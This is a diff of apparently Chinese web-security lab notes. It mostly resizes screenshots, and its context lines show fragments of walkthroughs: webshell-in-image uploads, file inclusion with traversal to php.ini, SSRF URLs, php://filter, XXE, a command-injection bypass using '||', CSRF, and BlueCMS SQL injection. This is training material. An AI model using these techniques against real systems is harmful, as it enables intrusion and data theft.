 
-<figure id="org565e207">
-<img src="./images/happy.gif" alt="happy.gif" width="60%">
+<figure id="org30dfcc7">
+<img src="./images/happy.gif" alt="happy.gif" width="90%">
 
 </figure>
 
@@ -6205,8 +6380,8 @@ Upload-labs（Pass-17）这一关比较综合，判断了后缀名、content-typ
 
 
 
-<figure id="org48a91d5">
-<img src="./images/img_20230712_072526.png" alt="img_20230712_072526.png" width="60%">
+<figure id="org2e49dc2">
+<img src="./images/img_20230712_072526.png" alt="img_20230712_072526.png" width="90%">
 
 </figure>
 
@@ -6243,15 +6418,15 @@ Upload-labs（Pass-17）这一关比较综合，判断了后缀名、content-typ
 为了防止被覆盖，先将插入木马位置后的所有内容剪贴出去，插入木马后再粘贴回来
 </p>
 
-<figure id="orge51f606">
-<img src="./images/img_20230713_005824.png" alt="img_20230713_005824.png" width="60%">
+<figure id="orgebb28c9">
+<img src="./images/img_20230713_005824.png" alt="img_20230713_005824.png" width="90%">
 
 </figure>
 
 
 
-<figure id="orga91a4f9">
-<img src="./images/img_20230713_010344.png" alt="img_20230713_010344.png" width="60%">
+<figure id="org310aa41">
+<img src="./images/img_20230713_010344.png" alt="img_20230713_010344.png" width="90%">
 
 </figure>
 
@@ -6263,15 +6438,15 @@ Upload-labs（Pass-17）这一关比较综合，判断了后缀名、content-typ
 
 
 
-<figure id="orgd88a4af">
-<img src="./images/img_20230713_010534.png" alt="img_20230713_010534.png" width="60%">
+<figure id="org49a2480">
+<img src="./images/img_20230713_010534.png" alt="img_20230713_010534.png" width="90%">
 
 </figure>
 
 
 
-<figure id="org61826c5">
-<img src="./images/img_20230713_010701.png" alt="img_20230713_010701.png" width="60%">
+<figure id="org67afa10">
+<img src="./images/img_20230713_010701.png" alt="img_20230713_010701.png" width="90%">
 
 </figure>
 
@@ -6279,8 +6454,8 @@ Upload-labs（Pass-17）这一关比较综合，判断了后缀名、content-typ
 二次渲染后，包含一句话木马的图片
 </p>
 
-<figure id="org450da2d">
-<img src="./images/1209577858.gif" alt="1209577858.gif" width="60%">
+<figure id="org0134f5b">
+<img src="./images/1209577858.gif" alt="1209577858.gif" width="90%">
 
 </figure>
 
@@ -6294,8 +6469,8 @@ Upload-labs（Pass-17）这一关比较综合，判断了后缀名、content-typ
 </div>
 
 
-<figure id="org8254fd8">
-<img src="./images/img_20230713_011058.png" alt="img_20230713_011058.png" width="60%">
+<figure id="org40e1640">
+<img src="./images/img_20230713_011058.png" alt="img_20230713_011058.png" width="90%">
 
 </figure>
 
@@ -6306,15 +6481,15 @@ Upload-labs（Pass-17）这一关比较综合，判断了后缀名、content-typ
 </p>
 
 
-<figure id="org1259e91">
-<img src="./images/img_20230713_011229.png" alt="img_20230713_011229.png" width="60%">
+<figure id="org361a8e3">
+<img src="./images/img_20230713_011229.png" alt="img_20230713_011229.png" width="90%">
 
 </figure>
 
 
 
-<figure id="orgb1f295b">
-<img src="./images/img_20230713_011354.png" alt="img_20230713_011354.png" width="60%">
+<figure id="org4b9c403">
+<img src="./images/img_20230713_011354.png" alt="img_20230713_011354.png" width="90%">
 
 </figure>
 </div>
@@ -6433,8 +6608,8 @@ Upload-labs（Pass-18），从源码来看，服务器先是将上传的文件�
 
 
 
-<figure id="org77197d1">
-<img src="./images/img_20230713_014435.png" alt="img_20230713_014435.png" width="60%">
+<figure id="org75fd419">
+<img src="./images/img_20230713_014435.png" alt="img_20230713_014435.png" width="90%">
 
 </figure>
 
@@ -6445,8 +6620,8 @@ Upload-labs（Pass-18），从源码来看，服务器先是将上传的文件�
 
 
 
-<figure id="org41275c1">
-<img src="./images/img_20230713_014500.png" alt="img_20230713_014500.png" width="60%">
+<figure id="org1ed7bda">
+<img src="./images/img_20230713_014500.png" alt="img_20230713_014500.png" width="90%">
 
 </figure>
 
@@ -6509,7 +6684,7 @@ Upload-labs（Pass-18），从源码来看，服务器先是将上传的文件�
 比如 Nginx可 按如下方式配置
 </p>
 
-<pre class="example" id="orgc4e8ff6">
+<pre class="example" id="orgbe92f19">
 location ~* ^/uploads/.*\.(php|php5)$ 
 {
   deny all;
@@ -6712,8 +6887,8 @@ c:\windows\php.ini // php &#37197;&#32622;&#20449;&#24687;
 </p>
 
 
-<figure id="org1904f80">
-<img src="./images/img_20230707_004252.png" alt="img_20230707_004252.png" width="60%">
+<figure id="org63f773c">
+<img src="./images/img_20230707_004252.png" alt="img_20230707_004252.png" width="90%">
 
 </figure>
 
@@ -6723,8 +6898,8 @@ c:\windows\php.ini // php &#37197;&#32622;&#20449;&#24687;
 
 
 
-<figure id="org131f78e">
-<img src="./images/img_20230707_004814.png" alt="img_20230707_004814.png" width="60%">
+<figure id="org1d96d6a">
+<img src="./images/img_20230707_004814.png" alt="img_20230707_004814.png" width="90%">
 
 </figure>
 
@@ -6772,8 +6947,8 @@ $<span style="color: #a0522d;">file</span> = $<span style="color: #a0522d;">_GET
 
 
 
-<figure id="org58db2f8">
-<img src="./images/img_20230707_005539.png" alt="img_20230707_005539.png" width="60%">
+<figure id="org0d25c9e">
+<img src="./images/img_20230707_005539.png" alt="img_20230707_005539.png" width="90%">
 
 </figure>
 
@@ -6785,15 +6960,15 @@ php.ini需要回退两次，可以输入 <code>../../php.ini</code>
 
 
 
-<figure id="orge24d5f2">
-<img src="./images/img_20230707_005630.png" alt="img_20230707_005630.png" width="60%">
+<figure id="org5b0a318">
+<img src="./images/img_20230707_005630.png" alt="img_20230707_005630.png" width="90%">
 
 </figure>
 
 
 
-<figure id="org01f1004">
-<img src="./images/img_20230707_005648.png" alt="img_20230707_005648.png" width="60%">
+<figure id="orgad4ee69">
+<img src="./images/img_20230707_005648.png" alt="img_20230707_005648.png" width="90%">
 
 </figure>
 
@@ -6803,8 +6978,8 @@ php.ini需要回退两次，可以输入 <code>../../php.ini</code>
 
 
 
-<figure id="org2386eb6">
-<img src="./images/img_20230707_005723.png" alt="img_20230707_005723.png" width="60%">
+<figure id="org0d22910">
+<img src="./images/img_20230707_005723.png" alt="img_20230707_005723.png" width="90%">
 
 </figure>
 </div>
@@ -6840,8 +7015,8 @@ Medium级别的代码增加了str_replace函数，对page参数进行了一定�
 
 
 
-<figure id="orgf3d1a8f">
-<img src="./images/img_20230707_010637.png" alt="img_20230707_010637.png" width="60%">
+<figure id="orgb0fe4fd">
+<img src="./images/img_20230707_010637.png" alt="img_20230707_010637.png" width="90%">
 
 </figure>
 
@@ -6851,8 +7026,8 @@ Medium级别的代码增加了str_replace函数，对page参数进行了一定�
 
 
 
-<figure id="orgf9f8009">
-<img src="./images/img_20230707_010731.png" alt="img_20230707_010731.png" width="60%">
+<figure id="org6b12e4c">
+<img src="./images/img_20230707_010731.png" alt="img_20230707_010731.png" width="90%">
 
 </figure>
 </div>
@@ -6905,8 +7080,8 @@ flags &#21487;&#36873;&#12290;
 
 
 
-<figure id="org3e30691">
-<img src="./images/img_20230707_011051.png" alt="img_20230707_011051.png" width="60%">
+<figure id="org1c87bde">
+<img src="./images/img_20230707_011051.png" alt="img_20230707_011051.png" width="90%">
 
 </figure>
 </div>
@@ -6965,8 +7140,8 @@ page参数改为远程服务器的文件地址；此处注意包含的远程文�
 </div>
 
 
-<figure id="org4361579">
-<img src="./images/img_20230707_011344.png" alt="img_20230707_011344.png" width="60%">
+<figure id="org9ac7a81">
+<img src="./images/img_20230707_011344.png" alt="img_20230707_011344.png" width="90%">
 
 </figure>
 </div>
@@ -7007,8 +7182,8 @@ http://127.0.0.1:8080/vulnerabilities/fi/?<span style="color: #a0522d;">page</sp
 
 
 
-<figure id="org734f750">
-<img src="./images/img_20230707_011620.png" alt="img_20230707_011620.png" width="60%">
+<figure id="orgddb852c">
+<img src="./images/img_20230707_011620.png" alt="img_20230707_011620.png" width="90%">
 
 </figure>
 
@@ -7049,8 +7224,8 @@ http://127.0.0.1:8080/vulnerabilities/fi/?<span style="color: #a0522d;">page</sp
 
 
 
-<figure id="org36f8307">
-<img src="./images/img_20230707_011915.png" alt="img_20230707_011915.png" width="60%">
+<figure id="orgd2821c5">
+<img src="./images/img_20230707_011915.png" alt="img_20230707_011915.png" width="90%">
 
 </figure>
 
@@ -7128,8 +7303,8 @@ CSRF攻击原理及过程如下：
 
 
 
-<figure id="org8150055">
-<img src="./images/img_20230707_065952.png" alt="img_20230707_065952.png" width="60%">
+<figure id="orgb73e741">
+<img src="./images/img_20230707_065952.png" alt="img_20230707_065952.png" width="90%">
 
 </figure>
 
@@ -7248,8 +7423,8 @@ CSRF
 
 
 
-<figure id="orge3fa764">
-<img src="./images/img_20230707_071101.png" alt="img_20230707_071101.png" width="60%">
+<figure id="orgfa194ee">
+<img src="./images/img_20230707_071101.png" alt="img_20230707_071101.png" width="90%">
 
 </figure>
 
@@ -7276,8 +7451,8 @@ CSRF
 </p>
 
 
-<figure id="orgaea964a">
-<img src="./images/img_20230707_071302.png" alt="img_20230707_071302.png" width="60%">
+<figure id="orgfe67373">
+<img src="./images/img_20230707_071302.png" alt="img_20230707_071302.png" width="90%">
 
 </figure>
 
@@ -7303,8 +7478,8 @@ CSRF
 </p>
 
 
-<figure id="org7090fc2">
-<img src="./images/img_20230707_071423.png" alt="img_20230707_071423.png" width="60%">
+<figure id="orgde01078">
+<img src="./images/img_20230707_071423.png" alt="img_20230707_071423.png" width="90%">
 
 </figure>
 </div>
@@ -7375,8 +7550,8 @@ medium类型的代码在 Low 的基础上增加了<a href="https://www.yiibai.co
 
 
 
-<figure id="orged826dd">
-<img src="./images/img_20230707_112000.png" alt="img_20230707_112000.png" width="60%">
+<figure id="orgf511cc0">
+<img src="./images/img_20230707_112000.png" alt="img_20230707_112000.png" width="90%">
 
 </figure>
 
@@ -7403,8 +7578,8 @@ High级别的代码增加了Anti-CSRF token机制，用户每次访问改密页�
 
 
 
-<figure id="org191d1cc">
-<img src="./images/img_20230714_100546.png" alt="img_20230714_100546.png" width="60%">
+<figure id="org62fce9a">
+<img src="./images/img_20230714_100546.png" alt="img_20230714_100546.png" width="90%">
 
 </figure>
 
@@ -7464,8 +7639,8 @@ High级别的代码增加了Anti-CSRF token机制，用户每次访问改密页�
 
 
 
-<figure id="orgcef8ef9">
-<img src="./images/img_20230707_112241.png" alt="img_20230707_112241.png" width="60%">
+<figure id="org5e54c9b">
+<img src="./images/img_20230707_112241.png" alt="img_20230707_112241.png" width="90%">
 
 </figure>
 
@@ -7484,8 +7659,8 @@ PHPSESSID=hrcmlfmsim5ut4699l9t39t0s0; security=low
 
 
 
-<figure id="org9f3067e">
-<img src="./images/img_20230707_112315.png" alt="img_20230707_112315.png" width="60%">
+<figure id="org0aac185">
+<img src="./images/img_20230707_112315.png" alt="img_20230707_112315.png" width="90%">
 
 </figure>
 
@@ -7516,8 +7691,8 @@ PHPSESSID=hrcmlfmsim5ut4699l9t39t0s0; security=low
 
 
 
-<figure id="orge434634">
-<img src="./images/img_20230707_112426.png" alt="img_20230707_112426.png" width="60%">
+<figure id="org2ec31b1">
+<img src="./images/img_20230707_112426.png" alt="img_20230707_112426.png" width="90%">
 
 </figure>
 
@@ -7582,8 +7757,8 @@ HTTP/1.
 
 
 
-<figure id="orgac5d873">
-<img src="./images/img_20230707_112851.png" alt="img_20230707_112851.png" width="60%">
+<figure id="org31fc29d">
+<img src="./images/img_20230707_112851.png" alt="img_20230707_112851.png" width="90%">
 
 </figure>
 
@@ -7650,15 +7825,15 @@ HTTP/1.
 
 
 
-<figure id="orgd4a8d36">
-<img src="./images/img_20230707_113110.png" alt="img_20230707_113110.png" width="60%">
+<figure id="orgda2b795">
+<img src="./images/img_20230707_113110.png" alt="img_20230707_113110.png" width="90%">
 
 </figure>
 
 
 
-<figure id="org6225d4d">
-<img src="./images/img_20230707_113147.png" alt="img_20230707_113147.png" width="60%">
+<figure id="orgf3795e0">
+<img src="./images/img_20230707_113147.png" alt="img_20230707_113147.png" width="90%">
 
 </figure>
 
@@ -7672,8 +7847,8 @@ HTTP/1.
 
 
 
-<figure id="org77e194e">
-<img src="./images/img_20230707_113214.png" alt="img_20230707_113214.png" width="60%">
+<figure id="orgbf640b5">
+<img src="./images/img_20230707_113214.png" alt="img_20230707_113214.png" width="90%">
 
 </figure>
 
@@ -7786,8 +7961,8 @@ SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻�
 
 
 
-<figure id="orgfccf136">
-<img src="./images/img_20230717_142934.png" alt="img_20230717_142934.png" width="60%">
+<figure id="orga3744b9">
+<img src="./images/img_20230717_142934.png" alt="img_20230717_142934.png" width="90%">
 
 </figure>
 </div>
@@ -8012,8 +8187,8 @@ domain
 
 
 
-<figure id="org5e3b74d">
-<img src="./images/img_20230717_144211.png" alt="img_20230717_144211.png" width="60%">
+<figure id="orgf53961c">
+<img src="./images/img_20230717_144211.png" alt="img_20230717_144211.png" width="90%">
 
 </figure>
 
@@ -8039,8 +8214,8 @@ ping 0x7f.0.0.1
 </div>
 
 
-<figure id="orga3b828a">
-<img src="./images/img_20230717_150054.png" alt="img_20230717_150054.png" width="60%">
+<figure id="orgf033100">
+<img src="./images/img_20230717_150054.png" alt="img_20230717_150054.png" width="90%">
 
 </figure>
 </div>
@@ -8111,8 +8286,8 @@ http://www.xxx.com/a.php?<span style="color: #a0522d;">image</span>=http://bljjf
 </ul>
 
 
-<figure id="org1e53ff1">
-<img src="./images/img_20230717_150643.png" alt="img_20230717_150643.png" width="60%">
+<figure id="org8eed5c1">
+<img src="./images/img_20230717_150643.png" alt="img_20230717_150643.png" width="90%">
 
 </figure>
 
@@ -8134,8 +8309,8 @@ http://124.222.171.19:8083/vul/ssrf/ssrf_curl.php?<span style="color: #a0522d;">
 
 
 
-<figure id="orgf3c8431">
-<img src="./images/img_20230717_150702.png" alt="img_20230717_150702.png" width="60%">
+<figure id="org8539212">
+<img src="./images/img_20230717_150702.png" alt="img_20230717_150702.png" width="90%">
 
 </figure>
 
@@ -8152,8 +8327,8 @@ http://127.0.0.1/vul/ssrf/ssrf_fgc.php?<span style="color: #a0522d;">url</span>=
 </div>
 
 
-<figure id="org71ffd34">
-<img src="./images/img_20230717_151145.png" alt="img_20230717_151145.png" width="60%">
+<figure id="orgd264994">
+<img src="./images/img_20230717_151145.png" alt="img_20230717_151145.png" width="90%">
 
 </figure>
 
@@ -8168,8 +8343,8 @@ http://127.0.0.1/vul/ssrf/ssrf_fgc.php?<span style="color: #a0522d;">url</span>=
 
 
 
-<figure id="orgd1149de">
-<img src="./images/img_20230717_151241.png" alt="img_20230717_151241.png" width="60%">
+<figure id="org9814fd5">
+<img src="./images/img_20230717_151241.png" alt="img_20230717_151241.png" width="90%">
 
 </figure>
 </div>
@@ -8246,8 +8421,8 @@ file_get_contents里面带有php://filter 我们用它就可以来读取php源�
 
 
 
-<figure id="org0b782b0">
-<img src="./images/img_20230717_155113.png" alt="img_20230717_155113.png" width="60%">
+<figure id="org11d498f">
+<img src="./images/img_20230717_155113.png" alt="img_20230717_155113.png" width="90%">
 
 </figure>
 
@@ -8270,8 +8445,8 @@ file_get_contents里面带有php://filter 我们用它就可以来读取php源�
 
 
 
-<figure id="orge2da830">
-<img src="./images/img_20230717_160000.png" alt="img_20230717_160000.png" width="60%">
+<figure id="orgd078fbd">
+<img src="./images/img_20230717_160000.png" alt="img_20230717_160000.png" width="90%">
 
 </figure>
 
@@ -8339,8 +8514,8 @@ XML是用于标记电子文件使其具有结构性的标记语言，可以用�
 
 
 
-<figure id="org15b194e">
-<img src="./images/img_20230717_164102.png" alt="img_20230717_164102.png" width="60%">
+<figure id="org7d8e75e">
+<img src="./images/img_20230717_164102.png" alt="img_20230717_164102.png" width="90%">
 
 </figure>
 
@@ -8553,8 +8728,8 @@ PHP中可以通过FILE协议、HTTP协议和FTP协议读取文件，还可利用
 
 
 
-<figure id="orgb31cdea">
-<img src="./images/img_20230717_170448.png" alt="img_20230717_170448.png" width="60%">
+<figure id="orge9942f5">
+<img src="./images/img_20230717_170448.png" alt="img_20230717_170448.png" width="90%">
 
 </figure>
 
@@ -8573,8 +8748,8 @@ PHP中可以通过FILE协议、HTTP协议和FTP协议读取文件，还可利用
 
 
 
-<figure id="org2cabda1">
-<img src="./images/img_20230717_170637.png" alt="img_20230717_170637.png" width="60%">
+<figure id="orgc4e6217">
+<img src="./images/img_20230717_170637.png" alt="img_20230717_170637.png" width="90%">
 
 </figure>
 </div>
@@ -8676,8 +8851,8 @@ ping + IP地址，如图：
 
 
 
-<figure id="org4ec6965">
-<img src="./images/img_20230717_171102.png" alt="img_20230717_171102.png" width="60%">
+<figure id="orge1ba71f">
+<img src="./images/img_20230717_171102.png" alt="img_20230717_171102.png" width="90%">
 
 </figure>
 
@@ -8761,8 +8936,8 @@ target参数为将要ping的ip地址，比如在输入框输入127.0.0.1。
 </p>
 
 
-<figure id="orga1da0f3">
-<img src="./images/img_20230717_171558.png" alt="img_20230717_171558.png" width="60%">
+<figure id="org7ebea16">
+<img src="./images/img_20230717_171558.png" alt="img_20230717_171558.png" width="90%">
 
 </figure>
 
@@ -8772,8 +8947,8 @@ target参数为将要ping的ip地址，比如在输入框输入127.0.0.1。
 </div>
 
 
-<figure id="org9457728">
-<img src="./images/img_20230717_171631.png" alt="img_20230717_171631.png" width="60%">
+<figure id="orga618e3d">
+<img src="./images/img_20230717_171631.png" alt="img_20230717_171631.png" width="90%">
 
 </figure>
 </div>
@@ -8826,15 +9001,15 @@ Medium只对&amp;&amp;与;两种符号进行过滤，所以用其他的 <code>||
 </div>
 
 
-<figure id="org89bda00">
-<img src="./images/img_20230717_171940.png" alt="img_20230717_171940.png" width="60%">
+<figure id="org1d9d1db">
+<img src="./images/img_20230717_171940.png" alt="img_20230717_171940.png" width="90%">
 
 </figure>
 
 
 
-<figure id="orgf1528b7">
-<img src="./images/img_20230717_171953.png" alt="img_20230717_171953.png" width="60%">
+<figure id="orga2aba6a">
+<img src="./images/img_20230717_171953.png" alt="img_20230717_171953.png" width="90%">
 
 </figure>
 </div>
@@ -8893,8 +9068,8 @@ Medium只对&amp;&amp;与;两种符号进行过滤，所以用其他的 <code>||
 
 
 
-<figure id="orgec52b72">
-<img src="./images/img_20230717_172116.png" alt="img_20230717_172116.png" width="60%">
+<figure id="orgfa87cb5">
+<img src="./images/img_20230717_172116.png" alt="img_20230717_172116.png" width="90%">
 
 </figure>
 </div>
@@ -8942,8 +9117,8 @@ xxx_C1 = new xxx();
 
 
 
-<figure id="orgd39f135">
-<img src="./images/img_20230717_172351.png" alt="img_20230717_172351.png" width="60%">
+<figure id="orgfee17f7">
+<img src="./images/img_20230717_172351.png" alt="img_20230717_172351.png" width="90%">
 
 </figure>
 </div>
@@ -9104,15 +9279,15 @@ fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #
 </ul>
 
 
-<figure id="orgf572871">
-<img src="./images/img_20230718_140008.png" alt="img_20230718_140008.png" width="60%">
+<figure id="org946e305">
+<img src="./images/img_20230718_140008.png" alt="img_20230718_140008.png" width="90%">
 
 </figure>
 
 
 
-<figure id="org0e1f5fe">
-<img src="./images/img_20230718_140027.png" alt="img_20230718_140027.png" width="60%">
+<figure id="orgbd6c381">
+<img src="./images/img_20230718_140027.png" alt="img_20230718_140027.png" width="90%">
 
 </figure>
 
@@ -9123,8 +9298,8 @@ fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #
 
 
 
-<figure id="org759d5e6">
-<img src="./images/img_20230718_140133.png" alt="img_20230718_140133.png" width="60%">
+<figure id="org1815503">
+<img src="./images/img_20230718_140133.png" alt="img_20230718_140133.png" width="90%">
 
 </figure>
 
@@ -9138,8 +9313,8 @@ fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #
 
 
 
-<figure id="org527786e">
-<img src="./images/img_20230718_140211.png" alt="img_20230718_140211.png" width="60%">
+<figure id="orgaf54e10">
+<img src="./images/img_20230718_140211.png" alt="img_20230718_140211.png" width="90%">
 
 </figure>
 
@@ -9149,8 +9324,8 @@ fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #
 
 
 
-<figure id="orgd135bc1">
-<img src="./images/img_20230718_140234.png" alt="img_20230718_140234.png" width="60%">
+<figure id="org4fe6ebc">
+<img src="./images/img_20230718_140234.png" alt="img_20230718_140234.png" width="90%">
 
 </figure>
 
@@ -9168,8 +9343,8 @@ fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #
 
 
 
-<figure id="org227a3bc">
-<img src="./images/img_20230718_140305.png" alt="img_20230718_140305.png" width="60%">
+<figure id="org9a420cc">
+<img src="./images/img_20230718_140305.png" alt="img_20230718_140305.png" width="90%">
 
 </figure>
 
@@ -9180,8 +9355,8 @@ fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #
 
 
 
-<figure id="orgc7d28f9">
-<img src="./images/img_20230718_140332.png" alt="img_20230718_140332.png" width="60%">
+<figure id="org4208bb0">
+<img src="./images/img_20230718_140332.png" alt="img_20230718_140332.png" width="90%">
 
 </figure>
 
@@ -9193,8 +9368,8 @@ fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #
 
 
 
-<figure id="orgf6f1398">
-<img src="./images/img_20230718_140408.png" alt="img_20230718_140408.png" width="60%">
+<figure id="org8bc827d">
+<img src="./images/img_20230718_140408.png" alt="img_20230718_140408.png" width="90%">
 
 </figure>
 
@@ -9210,8 +9385,8 @@ fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #
 
 
 
-<figure id="orga109b88">
-<img src="./images/img_20230718_140444.png" alt="img_20230718_140444.png" width="60%">
+<figure id="orgf3dd472">
+<img src="./images/img_20230718_140444.png" alt="img_20230718_140444.png" width="90%">
 
 </figure>
 
@@ -9227,8 +9402,8 @@ C:\phpstudy_pro\WWW\FCKeditor\editor\filemanager\browser\default\connectors\php\
 
 
 
-<figure id="org8f3f5fe">
-<img src="./images/img_20230718_140523.png" alt="img_20230718_140523.png" width="60%">
+<figure id="org648a0f5">
+<img src="./images/img_20230718_140523.png" alt="img_20230718_140523.png" width="90%">
 
 </figure>
 
@@ -9240,8 +9415,8 @@ C:\phpstudy_pro\WWW\FCKeditor\editor\filemanager\browser\default\connectors\php\
 
 
 
-<figure id="orgd421f46">
-<img src="./images/img_20230718_140559.png" alt="img_20230718_140559.png" width="60%">
+<figure id="org6d7ae03">
+<img src="./images/img_20230718_140559.png" alt="img_20230718_140559.png" width="90%">
 
 </figure>
 
@@ -9251,8 +9426,8 @@ C:\phpstudy_pro\WWW\FCKeditor\editor\filemanager\browser\default\connectors\php\
 
 
 
-<figure id="org7708311">
-<img src="./images/img_20230718_140620.png" alt="img_20230718_140620.png" width="60%">
+<figure id="org66a76fb">
+<img src="./images/img_20230718_140620.png" alt="img_20230718_140620.png" width="90%">
 
 </figure>
 
@@ -9263,8 +9438,8 @@ C:\phpstudy_pro\WWW\FCKeditor\editor\filemanager\browser\default\connectors\php\
 
 
 
-<figure id="orga73c725">
-<img src="./images/img_20230718_140654.png" alt="img_20230718_140654.png" width="60%">
+<figure id="orgb7d0c03">
+<img src="./images/img_20230718_140654.png" alt="img_20230718_140654.png" width="90%">
 
 </figure>
 
@@ -9274,8 +9449,8 @@ C:\phpstudy_pro\WWW\FCKeditor\editor\filemanager\browser\default\connectors\php\
 
 
 
-<figure id="org0f3c69e">
-<img src="./images/img_20230718_140714.png" alt="img_20230718_140714.png" width="60%">
+<figure id="orgfbe5a24">
+<img src="./images/img_20230718_140714.png" alt="img_20230718_140714.png" width="90%">
 
 </figure>
 
@@ -9286,8 +9461,8 @@ C:\phpstudy_pro\WWW\FCKeditor\editor\filemanager\browser\default\connectors\php\
 
 
 
-<figure id="orgdae9183">
-<img src="./images/img_20230718_140736.png" alt="img_20230718_140736.png" width="60%">
+<figure id="org5d0c9ef">
+<img src="./images/img_20230718_140736.png" alt="img_20230718_140736.png" width="90%">
 
 </figure>
 
@@ -9296,8 +9471,8 @@ C:\phpstudy_pro\WWW\FCKeditor\editor\filemanager\browser\default\connectors\php\
 </p>
 
 
-<figure id="org991ddcf">
-<img src="./images/img_20230718_140758.png" alt="img_20230718_140758.png" width="60%">
+<figure id="org2434350">
+<img src="./images/img_20230718_140758.png" alt="img_20230718_140758.png" width="90%">
 
 </figure>
 </div>
@@ -9350,8 +9525,8 @@ error_reporting = E_ALL &amp; ~E_NOTICE
 
 
 
-<figure id="orgb992077">
-<img src="./images/img_20230718_141014.png" alt="img_20230718_141014.png" width="60%">
+<figure id="org24415b0">
+<img src="./images/img_20230718_141014.png" alt="img_20230718_141014.png" width="90%">
 
 </figure>
 
@@ -9361,8 +9536,8 @@ error_reporting = E_ALL &amp; ~E_NOTICE
 
 
 
-<figure id="org3026c43">
-<img src="./images/img_20230718_141112.png" alt="img_20230718_141112.png" width="60%">
+<figure id="org7afdf5a">
+<img src="./images/img_20230718_141112.png" alt="img_20230718_141112.png" width="90%">
 
 </figure>
 
@@ -9372,8 +9547,8 @@ error_reporting = E_ALL &amp; ~E_NOTICE
 
 
 
-<figure id="org6b871a4">
-<img src="./images/img_20230725_102529.png" alt="img_20230725_102529.png" width="60%">
+<figure id="org0dc912b">
+<img src="./images/img_20230725_102529.png" alt="img_20230725_102529.png" width="90%">
 
 </figure>
 
@@ -9384,8 +9559,8 @@ error_reporting = E_ALL &amp; ~E_NOTICE
 
 
 
-<figure id="orgc9ffcec">
-<img src="./images/img_20230718_141201.png" alt="img_20230718_141201.png" width="60%">
+<figure id="org4c55214">
+<img src="./images/img_20230718_141201.png" alt="img_20230718_141201.png" width="90%">
 
 </figure>
 
@@ -9417,8 +9592,8 @@ error_reporting = E_ALL &amp; ~E_NOTICE
 </div>
 
 
-<figure id="orga0d16bd">
-<img src="./images/img_20230718_141412.png" alt="img_20230718_141412.png" width="60%">
+<figure id="org6d59c16">
+<img src="./images/img_20230718_141412.png" alt="img_20230718_141412.png" width="90%">
 
 </figure>
 
@@ -9457,14 +9632,14 @@ http://192.168.190.128/bluecms/uploads/admin/login.php?<span style="color: #a052
 
 
 
-<figure id="org8244520">
-<img src="./images/img_20230718_141452.png" alt="img_20230718_141452.png" width="60%">
+<figure id="orgb461d96">
+<img src="./images/img_20230718_141452.png" alt="img_20230718_141452.png" width="90%">
 
 </figure>
 
 
-<figure id="org9a5072f">
-<img src="./images/img_20230718_141513.png" alt="img_20230718_141513.png" width="60%">
+<figure id="orgdd9f8ce">
+<img src="./images/img_20230718_141513.png" alt="img_20230718_141513.png" width="90%">
 
 </figure>
 
@@ -9473,8 +9648,8 @@ http://192.168.190.128/bluecms/uploads/admin/login.php?<span style="color: #a052
 </p>
 
 
-<figure id="org778822d">
-<img src="./images/img_20230718_141531.png" alt="img_20230718_141531.png" width="60%">
+<figure id="orgd5ed180">
+<img src="./images/img_20230718_141531.png" alt="img_20230718_141531.png" width="90%">
 
 </figure>
 
@@ -9500,8 +9675,8 @@ http://192.168.190.128/bluecms/uploads/admin/login.php?<span style="color: #a052
 </div>
 
 
-<figure id="org34e46ed">
-<img src="./images/img_20230718_141739.png" alt="img_20230718_141739.png" width="60%">
+<figure id="orgae4b0d4">
+<img src="./images/img_20230718_141739.png" alt="img_20230718_141739.png" width="90%">
 
 </figure>
 
@@ -9520,8 +9695,8 @@ http://192.168.190.128/bluecms/uploads/admin/login.php?<span style="color: #a052
 
 
 
-<figure id="org5f71814">
-<img src="./images/img_20230718_141812.png" alt="img_20230718_141812.png" width="60%">
+<figure id="orga998bc7">
+<img src="./images/img_20230718_141812.png" alt="img_20230718_141812.png" width="90%">
 
 </figure>
 
@@ -9530,8 +9705,8 @@ order by 8报错，证明sql语句查了7列：
 </p>
 
 
-<figure id="org41c7db7">
-<img src="./images/img_20230718_141834.png" alt="img_20230718_141834.png" width="60%">
+<figure id="orga404ac9">
+<img src="./images/img_20230718_141834.png" alt="img_20230718_141834.png" width="90%">
 
 </figure>
 
@@ -9548,8 +9723,8 @@ order by 8报错，证明sql语句查了7列：
 </div>
 
 
-<figure id="orgea07719">
-<img src="./images/img_20230718_141929.png" alt="img_20230718_141929.png" width="60%">
+<figure id="org4f6b801">
+<img src="./images/img_20230718_141929.png" alt="img_20230718_141929.png" width="90%">
 
 </figure>
 
@@ -9563,8 +9738,8 @@ order by 8报错，证明sql语句查了7列：
 </div>
 
 
-<figure id="org5ccd86d">
-<img src="./images/img_20230718_142008.png" alt="img_20230718_142008.png" width="60%">
+<figure id="orgfc443e0">
+<img src="./images/img_20230718_142008.png" alt="img_20230718_142008.png" width="90%">
 
 </figure>
 
@@ -9578,8 +9753,8 @@ order by 8报错，证明sql语句查了7列：
 </div>
 
 
-<figure id="orgb0f293a">
-<img src="./images/img_20230718_142106.png" alt="img_20230718_142106.png" width="60%">
+<figure id="org275fb44">
+<img src="./images/img_20230718_142106.png" alt="img_20230718_142106.png" width="90%">
 
 </figure>
 
@@ -9598,8 +9773,8 @@ order by 8报错，证明sql语句查了7列：
 </p>
 
 
-<figure id="org505c989">
-<img src="./images/img_20230718_142533.png" alt="img_20230718_142533.png" width="60%">
+<figure id="org2981be1">
+<img src="./images/img_20230718_142533.png" alt="img_20230718_142533.png" width="90%">
 
 </figure>
 
@@ -9614,8 +9789,8 @@ order by 8报错，证明sql语句查了7列：
 
 
 
-<figure id="orgb02f0d0">
-<img src="./images/img_20230718_143033.png" alt="img_20230718_143033.png" width="60%">
+<figure id="orgc18108f">
+<img src="./images/img_20230718_143033.png" alt="img_20230718_143033.png" width="90%">
 
 </figure>
 
@@ -9634,8 +9809,8 @@ order by 8报错，证明sql语句查了7列：
 
 
 
-<figure id="orgfd5f96d">
-<img src="./images/img_20230718_143133.png" alt="img_20230718_143133.png" width="60%">
+<figure id="orgad68594">
+<img src="./images/img_20230718_143133.png" alt="img_20230718_143133.png" width="90%">
 
 </figure>
 
@@ -9652,8 +9827,8 @@ admin以及21232f297a57a5a743894a0e4a801fc3，即web管理员的账号密码
